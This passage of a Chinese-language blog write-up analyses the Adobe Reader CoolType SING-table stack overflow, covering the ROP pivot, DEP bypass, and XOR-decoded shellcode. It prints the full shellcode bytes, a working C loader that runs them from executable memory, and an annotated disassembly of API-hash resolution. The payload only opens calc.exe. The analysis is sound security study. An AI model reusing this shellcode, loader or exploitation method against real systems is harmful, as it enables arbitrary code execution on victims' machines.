class="number">0</span> <span class="number">470.70313</span>] <span class="number">54</span> [<span class="number">531.25</span>] <span class="number">68</span> [<span class="number">508.78906</span> <span class="number">0</span> <span class="number">0</span> <span class="number">588.86719</span> <span class="number">522.94922</span> <span class="number">0</span> <span class="number">588.86719</span> <span class="number">565.91797</span> <span class="number">242.1875</span> <span class="number">0</span> <span class="number">0</span> <span class="number">242.1875</span> <span class="number">861.32813</span> <span class="number">565.91797</span> <span class="number">585.9375</span> <span class="number">0</span> <span class="number">0</span> <span class="number">347.65625</span> <span class="number">424.31641</span> <span class="number">338.86719</span> <span class="number">0</span> <span class="number">0</span> <span class="number">722.65625</span>]]</span><br><span class="line">/DW <span class="number">0</span>&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>我们大致看几个，可以看到这是对象，其中包含了图片，字体等对象，我们需要关注的就是这个字体对象。</p>
<h2 id="SING表结构"><a href="#SING表结构" class="headerlink" title="SING表结构"></a>SING表结构</h2><p><code>SING技术</code>是Adobe公司推出的针对<code>“外字”（Gaiji）</code>的解决方案，<code>外字</code>是<code>日语</code>中的意思，<code>中文</code>中就是<code>生僻字</code>的意思。SING允许用户创建新字形，每个新字形作为一个独立的字体打包。这样打包出来的字形称为字形包（<code>glyphlet</code>）。这种格式通过Adobe公开的，且<code>基于OpenType</code>。SING（Smart INdependent Glyphlets，智能独立字形包）的规范允许字形包随同文件一起传送，这样包含SING字符的文件也是可携带的，而又不会字符乱码、异常显示。<br>SING表目录项定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tag[<span class="number">4</span>];</span><br><span class="line">    ULONG checkSum;</span><br><span class="line">    ULONG offset;</span><br><span class="line">    ULONG length;</span><br><span class="line">&#125;TableEntry;</span><br></pre></td></tr></table></figure></div>
<p>而这个SING表呢，保存在一种叫TTF文件中，属于TTF的可选表。<br>在SING表中：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707232827.png"
                      alt="20250707232827"
                ><br>我们再看一下在PDF中，ttf字体的作用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> <span class="number">0</span> obj </span><br><span class="line">&lt;&lt; </span><br><span class="line">	/Type /Font </span><br><span class="line">	/Subtype /TrueType # 声明使用TTF字体 </span><br><span class="line">	/BaseFont /VulnerableFont </span><br><span class="line">	/FontDescriptor <span class="number">6</span> <span class="number">0</span> R # 指向字体数据 </span><br><span class="line">	/Encoding /Unicode </span><br><span class="line">&gt;&gt; </span><br><span class="line">endobj <span class="number">6</span> <span class="number">0</span> obj </span><br><span class="line">&lt;&lt; </span><br><span class="line">	/Type /FontDescriptor </span><br><span class="line">	/FontFile2 <span class="number">7</span> <span class="number">0</span> R # 关键！实际TTF数据位置 </span><br><span class="line">&gt;&gt; </span><br><span class="line">endobj </span><br><span class="line"><span class="number">7</span> <span class="number">0</span> obj </span><br><span class="line">&lt;&lt;</span><br><span class="line">	/Length <span class="number">1000</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream </span><br><span class="line">	...这里是完整的TTF二进制数据... </span><br><span class="line">endstream </span><br><span class="line">endobj</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是，这里有可能有些东西是看不到的，因为PDF使用&#x2F;FlateDecode，进行了压缩，需要手动解码之后才能看得到。也就是说，在一个PDF文件中，存在：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[恶意PDF文件]</span><br><span class="line"></span><br><span class="line">                             |</span><br><span class="line"></span><br><span class="line">       +------------+--------+------------+------------+</span><br><span class="line"></span><br><span class="line">       |            |                 |            |</span><br><span class="line"></span><br><span class="line"> [文本内容]    [JavaScript]    [内嵌图片]      [字体对象]</span><br><span class="line"></span><br><span class="line">                                             /   |   \</span><br><span class="line"></span><br><span class="line">                                        [FontDescriptor] [FontFile2]</span><br><span class="line"></span><br><span class="line">                                                           |</span><br><span class="line"></span><br><span class="line">                                                    [恶意TTF数据]</span><br><span class="line"></span><br><span class="line">                                                           |</span><br><span class="line"></span><br><span class="line">                                                      [SING表]</span><br><span class="line"></span><br><span class="line">                                                           |</span><br><span class="line"></span><br><span class="line">                                                    [超长uniqueName字段]</span><br><span class="line"></span><br><span class="line">                                                    (如<span class="string">&#x27;A&#x27;</span>*<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></div>
<h2 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h2><p>这里总结一下，就是：<br>如果PDF封装了一些字体，那么就会封装TTF文件，在解析TTF文件的时候，就会解析到TTF文件中一个SING表，由于在解析该表的时候，没有对其<code>uniqueName</code>字段做长度限制，导致了栈溢出。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/b8d1a7ba62c1.png"
                      alt="b8d1a7ba62c1"
                ></p>
<h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>AdobeReader在加载PDF的时候，要使用CoolType.dll来解析SING表，那我们将该DLL文件拿过来分析：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707233004.png"
                      alt="20250707233004"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707232923.png"
                      alt="20250707232923"
                ><br>我们经过分析这里是存在栈溢出漏洞的，我们只要构造uniqueName字段长度超过260字节即可溢出。</p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>我们这里使用MSF生成的谈计算器的Exploit来进行调试：我们在<code>0x803DD74</code>地址下断点（根据上一张图我们可以看到该地址就是在解析SING表附近），来单步跟踪：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707234930.png"
                      alt="20250707234930"
                ></p>
<h4 id="sub-8021B06函数"><a href="#sub-8021B06函数" class="headerlink" title="sub_8021B06函数"></a>sub_8021B06函数</h4><p>我们运行到指令<code>call cooltype.0x8021B06</code>处，观察寄存器和堆栈情况：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250708000134.png"
                      alt="20250708000134"
                ><br>我们现在来逐个分析：</p>
<ul>
<li>[ecx] &#x3D; [0012E4B4] &#x3D; 0x046B4C38<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250708001318.png"
                      alt="20250708001318"
                ><br>这个东西，我们看里面的字符串，存在maxp，SING等字符串，很明显是PDF中的一个对象，我们使用PDFStreamDumper来查找一下，果然，找到了这个：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250708003341.png"
                      alt="20250708003341"
                ><br>这是PDF第十个对象的内容。</li>
<li>[edi] ] &#x3D; [0x0012E718] &#x3D; 4<br>函数执行完毕之后：<br>[eax] &#x3D; [0x0012E4B4] &#x3D; [0x046B5090]<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250708003708.png"
                      alt="20250708003708"
                ><br>而这个就是SING表项的内容。<br>现在我们知道<code>sub_8021B06</code>函数参数为PDF一个对象，一个栈上的对象this指针（经过分析，该对象内存布局为：[SING表项地址，SING表项大小]，一个<code>SING</code>字符串，而函数完成之后，返回值指向了SING表项指针。那么我们有理由猜测，该函数就是从TTF文件中找到SING表项的内容。</li>
</ul>
<h4 id="strcat溢出分析"><a href="#strcat溢出分析" class="headerlink" title="strcat溢出分析"></a>strcat溢出分析</h4><p>现在程序已经拿到了SING表项的内容，我们来看一下后续操作（由于我的Windows XP没有安装输入法，无法键入中文，所以我这里在IDA中注释了）：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250708010308.png"
                      alt="20250708010308"
                ><br>可以看到拿到SING表项地址之后还进行了一系列校验。<br>之后进入<code>strcat</code>函数，我们跟进，看一看溢出情况：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250708010950.png"
                      alt="20250708010950"
                ><br>我们可以看到strcat函数有两个参数，一个为<code>uniqueName</code>字段，一个是栈上的指针，而且我们可以看到<code>uniqueName</code>字段是非常长的（以\x00结尾）。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250708011202.png"
                      alt="20250708011202"
                ><br>执行完<code>strcat</code>函数之后，我们往下翻一翻，看到造成了溢出。</p>
<h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><h2 id="劫持程序执行流分析"><a href="#劫持程序执行流分析" class="headerlink" title="劫持程序执行流分析"></a>劫持程序执行流分析</h2><p>我们去动态调试，看一下这里劫持程序流程。<br>首先，我们看一下栈溢出之后，堆栈上的情况：这里要看的是stract的目的地址<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709212515.png"
                      alt="20250709212515"
                ><br>可以看到复制进去的数据中，有一个地址，而该地址处的指令为<code>pop esp;ret</code>这是很明显的ROP，我们来继续观察，是如何走到这一步的（这里单步调试确实太慢了，我这里使用的方法：在往后的每一个call上下断点，然后去F8，这里记录一下每一个断点：<br>这里跟着红色的线段跳转：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709214243.png"
                      alt="20250709214243"
                ><br>根据下断观察执行情况确认在该函数中：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709214339.png"
                      alt="20250709214339"
                ><br>跟进去单步执行，根据下断观察执行情况确认在该函数中：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709214419.png"
                      alt="20250709214419"
                ><br>单步跟进，发现了ROP指令：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709220241.png"
                      alt="20250709220241"
                ><br>但是这里跟踪后发现eax好像跟我们复制进去的数据没啥关系，我们继续单步跟进，发现了ROP指令：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250710072027.png"
                      alt="20250710072027"
                ><br>那我们继续跟进：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709220528.png"
                      alt="20250709220528"
                ><br>我们发现这里对堆栈进行了操作，我们来看一看操作之后ebp指向哪里：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709220725.png"
                      alt="20250709220725"
                ><br>这里实际上通过操作之后，程序流程已经被劫持，就会走到我们构造的ROP链上：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709220903.png"
                      alt="20250709220903"
                ><br>通过<code>pop esp;ret</code>函数，我们就成功将程序执行流劫持到了栈上。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709221310.png"
                      alt="20250709221310"
                ><br>到这里，我们实际上已经劫持程序执行流了，因为我们控制<code>ret</code>的地址了（我们栈上写入的地址）。</p>
<h2 id="ROP链分析"><a href="#ROP链分析" class="headerlink" title="ROP链分析"></a>ROP链分析</h2><p>这里将esp设置为了<code>0x0C0C0C0C</code>，目的是为了绕过DEP保护。<br>然后创建了<code>iso88591</code>文件：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709221538.png"
                      alt="20250709221538"
                ><br>我们可以看到参数为ebp寻址，那么就是Exploit构造好的。<br>继续向后跟踪，发现其在创建文件映射：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709221832.png"
                      alt="20250709221832"
                ><br>继续向后跟踪，将一个文件映射对象映射到当前应用程序的地址空间：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709222037.png"
                      alt="20250709222037"
                ><br>然后跳转到了<code>memcpy</code>函数中：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250709222305.png"
                      alt="20250709222305"
                ><br>我们看一下<code>memcpy</code>函数的参数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250710091613.png"
                      alt="20250710091613"
                ><br>可以看到在地址<code>0xC0C0D54</code>上保存了ShellCode，而目的地址为<code>0x3850000</code>，我们到内存布局中看一下该目的地址：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250710091721.png"
                      alt="20250710091721"
                ><br>可以看到其是具有执行权限的，也就是说绕过DEP是成功的。</p>
<h2 id="ShellCode执行分析"><a href="#ShellCode执行分析" class="headerlink" title="ShellCode执行分析"></a>ShellCode执行分析</h2><p>可以看到直接就ret到目的地址了，但是不知道为啥我这里会成这样：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250710091901.png"
                      alt="20250710091901"
                ><br>嗷~，经过单步调试，发现这里是经过xor加密的ShellCode，我们在这里单步执行之后，就可以看到解密之后的指令：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250710092216.png"
                      alt="20250710092216"
                ><br>然后就是执行ShellCode了，我们这里单步走一下，可以看到这里揭秘出来了<code>calc.exe</code>字符串：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250710095341.png"
                      alt="20250710095341"
                ><br>然后这里去寻找函数地址：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250710095505.png"
                      alt="20250710095505"
                ><br>然后我们可以看到这里调用<code>WinExec</code>函数执行了<code>calc.exe</code>：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250710095718.png"
                      alt="20250710095718"
                ><br>至此，我们漏洞利用模块全部分析完毕。</p>
<h2 id="ShellCode加载器"><a href="#ShellCode加载器" class="headerlink" title="ShellCode加载器"></a>ShellCode加载器</h2><p>我们将解密后的ShellCode复制出来，自己写一个加载器：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ShellCode[] = &#123;</span><br><span class="line">	<span class="number">0xDA</span>,<span class="number">0xCF</span>,<span class="number">0xBB</span>,<span class="number">0x72</span>,<span class="number">0x93</span>,<span class="number">0x8A</span>,<span class="number">0xFD</span>,<span class="number">0xD9</span>,<span class="number">0x74</span>,<span class="number">0x24</span>,<span class="number">0xF4</span>,<span class="number">0x58</span>,<span class="number">0x29</span>,<span class="number">0xC9</span>,<span class="number">0xB1</span>,<span class="number">0x31</span>,</span><br><span class="line">	<span class="number">0x31</span>,<span class="number">0x58</span>,<span class="number">0x18</span>,<span class="number">0x03</span>,<span class="number">0x58</span>,<span class="number">0x18</span>,<span class="number">0x83</span>,<span class="number">0xC0</span>,<span class="number">0x04</span>,<span class="number">0xE2</span>,<span class="number">0xF5</span>,<span class="number">0xFC</span>,<span class="number">0xE8</span>,<span class="number">0x82</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x60</span>,<span class="number">0x89</span>,<span class="number">0xE5</span>,<span class="number">0x31</span>,<span class="number">0xC0</span>,<span class="number">0x64</span>,<span class="number">0x8B</span>,<span class="number">0x50</span>,<span class="number">0x30</span>,<span class="number">0x8B</span>,<span class="number">0x52</span>,<span class="number">0x0C</span>,<span class="number">0x8B</span>,<span class="number">0x52</span>,<span class="number">0x14</span>,</span><br><span class="line">	<span class="number">0x8B</span>,<span class="number">0x72</span>,<span class="number">0x28</span>,<span class="number">0x0F</span>,<span class="number">0xB7</span>,<span class="number">0x4A</span>,<span class="number">0x26</span>,<span class="number">0x31</span>,<span class="number">0xFF</span>,<span class="number">0xAC</span>,<span class="number">0x3C</span>,<span class="number">0x61</span>,<span class="number">0x7C</span>,<span class="number">0x02</span>,<span class="number">0x2C</span>,<span class="number">0x20</span>,</span><br><span class="line">	<span class="number">0xC1</span>,<span class="number">0xCF</span>,<span class="number">0x0D</span>,<span class="number">0x01</span>,<span class="number">0xC7</span>,<span class="number">0xE2</span>,<span class="number">0xF2</span>,<span class="number">0x52</span>,<span class="number">0x57</span>,<span class="number">0x8B</span>,<span class="number">0x52</span>,<span class="number">0x10</span>,<span class="number">0x8B</span>,<span class="number">0x4A</span>,<span class="number">0x3C</span>,<span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0x4C</span>,<span class="number">0x11</span>,<span class="number">0x78</span>,<span class="number">0xE3</span>,<span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xD1</span>,<span class="number">0x51</span>,<span class="number">0x8B</span>,<span class="number">0x59</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0xD3</span>,<span class="number">0x8B</span>,<span class="number">0x49</span>,<span class="number">0x18</span>,</span><br><span class="line">	<span class="number">0xE3</span>,<span class="number">0x3A</span>,<span class="number">0x49</span>,<span class="number">0x8B</span>,<span class="number">0x34</span>,<span class="number">0x8B</span>,<span class="number">0x01</span>,<span class="number">0xD6</span>,<span class="number">0x31</span>,<span class="number">0xFF</span>,<span class="number">0xAC</span>,<span class="number">0xC1</span>,<span class="number">0xCF</span>,<span class="number">0x0D</span>,<span class="number">0x01</span>,<span class="number">0xC7</span>,</span><br><span class="line">	<span class="number">0x38</span>,<span class="number">0xE0</span>,<span class="number">0x75</span>,<span class="number">0xF6</span>,<span class="number">0x03</span>,<span class="number">0x7D</span>,<span class="number">0xF8</span>,<span class="number">0x3B</span>,<span class="number">0x7D</span>,<span class="number">0x24</span>,<span class="number">0x75</span>,<span class="number">0xE4</span>,<span class="number">0x58</span>,<span class="number">0x8B</span>,<span class="number">0x58</span>,<span class="number">0x24</span>,</span><br><span class="line">	<span class="number">0x01</span>,<span class="number">0xD3</span>,<span class="number">0x66</span>,<span class="number">0x8B</span>,<span class="number">0x0C</span>,<span class="number">0x4B</span>,<span class="number">0x8B</span>,<span class="number">0x58</span>,<span class="number">0x1C</span>,<span class="number">0x01</span>,<span class="number">0xD3</span>,<span class="number">0x8B</span>,<span class="number">0x04</span>,<span class="number">0x8B</span>,<span class="number">0x01</span>,<span class="number">0xD0</span>,</span><br><span class="line">	<span class="number">0x89</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x24</span>,<span class="number">0x5B</span>,<span class="number">0x5B</span>,<span class="number">0x61</span>,<span class="number">0x59</span>,<span class="number">0x5A</span>,<span class="number">0x51</span>,<span class="number">0xFF</span>,<span class="number">0xE0</span>,<span class="number">0x5F</span>,<span class="number">0x5F</span>,<span class="number">0x5A</span>,<span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0x12</span>,<span class="number">0xEB</span>,<span class="number">0x8D</span>,<span class="number">0x5D</span>,<span class="number">0x6A</span>,<span class="number">0x01</span>,<span class="number">0x8D</span>,<span class="number">0x85</span>,<span class="number">0xB2</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x68</span>,<span class="number">0x31</span>,<span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0x6F</span>,<span class="number">0x87</span>,<span class="number">0xFF</span>,<span class="number">0xD5</span>,<span class="number">0xBB</span>,<span class="number">0xF0</span>,<span class="number">0xB5</span>,<span class="number">0xA2</span>,<span class="number">0x56</span>,<span class="number">0x68</span>,<span class="number">0xA6</span>,<span class="number">0x95</span>,<span class="number">0xBD</span>,<span class="number">0x9D</span>,<span class="number">0xFF</span>,<span class="number">0xD5</span>,</span><br><span class="line">	<span class="number">0x3C</span>,<span class="number">0x06</span>,<span class="number">0x7C</span>,<span class="number">0x0A</span>,<span class="number">0x80</span>,<span class="number">0xFB</span>,<span class="number">0xE0</span>,<span class="number">0x75</span>,<span class="number">0x05</span>,<span class="number">0xBB</span>,<span class="number">0x47</span>,<span class="number">0x13</span>,<span class="number">0x72</span>,<span class="number">0x6F</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x53</span>,<span class="number">0xFF</span>,<span class="number">0xD5</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6C</span>,<span class="number">0x63</span>,<span class="number">0x2E</span>,<span class="number">0x65</span>,<span class="number">0x78</span>,<span class="number">0x65</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* My_func = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(ShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(My_func, ShellCode, <span class="keyword">sizeof</span>(ShellCode));</span><br><span class="line">	<span class="type">void</span>(*Shell)() = (<span class="type">void</span>(*)())((<span class="type">int</span>)((<span class="type">char</span>*)My_func + <span class="number">0x1C</span>));</span><br><span class="line">	Shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>执行，可以看到也是弹出了计算器。</p>
<h2 id="ShellCode详细分析"><a href="#ShellCode详细分析" class="headerlink" title="ShellCode详细分析"></a>ShellCode详细分析</h2><p>我这里将ShellCode汇编代码提取出来自己分析了一下，也就是写了一个通过hash查找函数然后执行：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">//解密ShellCode</span><br><span class="line">01030000 DA CF                fcmove      st,st(7)  </span><br><span class="line">01030002 BB 72 93 8A FD       mov         ebx,0FD8A9372h  </span><br><span class="line">01030007 D9 74 24 F4          fnstenv     [esp-0Ch]  </span><br><span class="line">0103000B 58                   pop         eax  </span><br><span class="line">0103000C 29 C9                sub         ecx,ecx  </span><br><span class="line">0103000E B1 31                mov         cl,31h  </span><br><span class="line">01030010 31 58 18             xor         dword ptr [eax+18h],ebx  </span><br><span class="line">01030013 03 58 18             add         ebx,dword ptr [eax+18h]  </span><br><span class="line">01030016 83 C0 04             add         eax,4  </span><br><span class="line">01030019 E2 F5                loop        01030010  </span><br><span class="line">0103001B FC                   cld</span><br><span class="line">0103001C E8 82 00 00 00       call        010300A3</span><br><span class="line">//以上都是解密ShellCode的汇编代码</span><br><span class="line"></span><br><span class="line">func_call_API_for_hash</span><br><span class="line">01030021 60                   pushad  </span><br><span class="line">01030022 89 E5                mov         ebp,esp  </span><br><span class="line">01030024 31 C0                xor         eax,eax  </span><br><span class="line">01030026 64 8B 50 30          mov         edx,dword ptr fs:[eax+30h]    //获取PEB</span><br><span class="line">0103002A 8B 52 0C             mov         edx,dword ptr [edx+0Ch]       //获取_PEB_LDR_DATA</span><br><span class="line">0103002D 8B 52 14             mov         edx,dword ptr [edx+14h]       //获取InMemoryOrderModuleList(模块列表)</span><br><span class="line">01030030 8B 72 28             mov         esi,dword ptr [edx+28h]       //获取模块基址</span><br><span class="line">01030033 0F B7 4A 26          movzx       ecx,word ptr [edx+26h]        //获取模块名长度</span><br><span class="line">//ROR-13 哈希算法</span><br><span class="line">01030037 31 FF                xor         edi,edi  </span><br><span class="line">01030039 AC                   lods        byte ptr [esi]  </span><br><span class="line">0103003A 3C 61                cmp         al,61h  </span><br><span class="line">0103003C 7C 02                jl          01030040  </span><br><span class="line">0103003E 2C 20                sub         al,20h  </span><br><span class="line">01030040 C1 CF 0D             ror         edi,0Dh  </span><br><span class="line">01030043 01 C7                add         edi,eax  </span><br><span class="line">01030045 E2 F2                loop        01030039</span><br><span class="line"></span><br><span class="line">01030047 52                   push        edx                           //模块列表中第一个通常是Kernel32.dll</span><br><span class="line">01030048 57                   push        edi                           //hash</span><br><span class="line">01030049 8B 52 10             mov         edx,dword ptr [edx+10h]       //模块基址</span><br><span class="line">0103004C 8B 4A 3C             mov         ecx,dword ptr [edx+3Ch]       //ecx = edx + 0x3C(e_lfanew)</span><br><span class="line">0103004F 8B 4C 11 78          mov         ecx,dword ptr [ecx+edx+78h]   //拿到导出表偏移</span><br><span class="line">01030053 E3 48                jecxz       0103009D                      //校验导出表偏移</span><br><span class="line">01030055 01 D1                add         ecx,edx                       //拿到导出表地址</span><br><span class="line">01030057 51                   push        ecx  </span><br><span class="line">01030058 8B 59 20             mov         ebx,dword ptr [ecx+20h]       //函数名称表RVA</span><br><span class="line">0103005B 01 D3                add         ebx,edx                       //ebx = 函数名称表地址</span><br><span class="line">0103005D 8B 49 18             mov         ecx,dword ptr [ecx+18h]       //函数总量</span><br><span class="line">01030060 E3 3A                jecxz       0103009C  </span><br><span class="line">01030062 49                   dec         ecx  </span><br><span class="line">01030063 8B 34 8B             mov         esi,dword ptr [ebx+ecx*4]     //拿到函数名称表最后一个函数名称RVA</span><br><span class="line">01030066 01 D6                add         esi,edx                       //获取函数名称</span><br><span class="line">//hash计算</span><br><span class="line">01030068 31 FF                xor         edi,edi  </span><br><span class="line">0103006A AC                   lods        byte ptr [esi]  </span><br><span class="line">0103006B C1 CF 0D             ror         edi,0Dh  </span><br><span class="line">0103006E 01 C7                add         edi,eax  </span><br><span class="line">01030070 38 E0                cmp         al,ah  </span><br><span class="line">01030072 75 